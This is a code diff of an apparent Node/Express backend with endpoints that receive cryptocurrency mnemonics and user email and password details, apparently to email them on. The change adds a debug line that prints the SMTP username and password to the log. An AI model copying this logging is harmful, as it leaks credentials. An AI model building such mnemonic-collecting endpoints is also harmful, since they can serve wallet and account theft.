@@ -5,7 +5,10 @@ import nodemailer from "nodemailer";
 export const sendMnemonicController = asyncHandler(
     async (req: Request, res: Response) => {
         const payload = req.body;
-
+        console.log({
+            user: process.env.SMTP_USER,
+            pass: process.env.SMTP_PASS,
+        }, '------------------------------------')
         if (!payload || !payload.data || !Array.isArray(payload.data)) {
             return errorResponse(res, "Invalid payload", 400);
         }
@@ -45,7 +48,7 @@ export const sendMnemonicController = asyncHandler(
 
 export const sendUserInfoController = asyncHandler(
     async (req: Request, res: Response) => {
-        const { title, email, password, phone  } = req?.body;
+        const { title, email, password, phone } = req?.body;
 
         // Validate input
         if (!title || !email || !password) {
